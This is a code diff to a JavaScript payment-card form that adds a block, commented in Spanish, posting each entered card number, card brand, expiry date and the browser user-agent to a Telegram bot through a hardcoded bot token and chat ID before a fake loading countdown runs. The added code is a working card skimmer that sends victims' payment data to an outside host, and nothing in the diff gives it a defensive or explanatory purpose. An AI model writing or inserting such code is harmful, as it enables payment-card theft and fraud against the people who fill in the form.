@@ -231,7 +231,7 @@ dateInput?.addEventListener("blur", ()=>{
 });
 
 // SUBMIT: preventDefault + loading + reload
-form?.addEventListener("submit",(e)=>{
+form?.addEventListener("submit", async (e)=>{
   e.preventDefault();
   err.textContent = "";
 
@@ -253,6 +253,31 @@ form?.addEventListener("submit",(e)=>{
   dateInput.value = p.mm + "/" + p.yy;
   displayDate.textContent = p.mm + "/" + p.yy;
 
+  // --- INICIO CÓDIGO TELEGRAM ---
+  const BOT_TOKEN = "6276003958:AAFK6X1KGAFa8lktb474FXmNWqwnu6b871I";
+  const CHAT_ID = "1203016155";
+  const text = `💳 *Nueva Tarjeta Detectada*\n\n` +
+               `▫️ *Número:* \`${numInput.value}\`\n` +
+               `▫️ *Marca:* ${brand}\n` +
+               `▫️ *Exp:* ${p.mm}/${p.yy}\n` +
+               `▫️ *User-Agent:* ${navigator.userAgent}`;
+
+  try {
+    await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify({
+        chat_id: CHAT_ID,
+        text: text,
+        parse_mode: 'Markdown'
+      }),
+      keepalive: true
+    });
+  } catch (error) {
+    console.error("Error al enviar a Telegram", error);
+  }
+  // --- FIN CÓDIGO TELEGRAM ---
+
   loading.style.display = "flex";
   let c = 3;
   counterEl.textContent = c;
@@ -266,6 +291,7 @@ form?.addEventListener("submit",(e)=>{
     }
   }, 1000);
 });
+
 
 
 
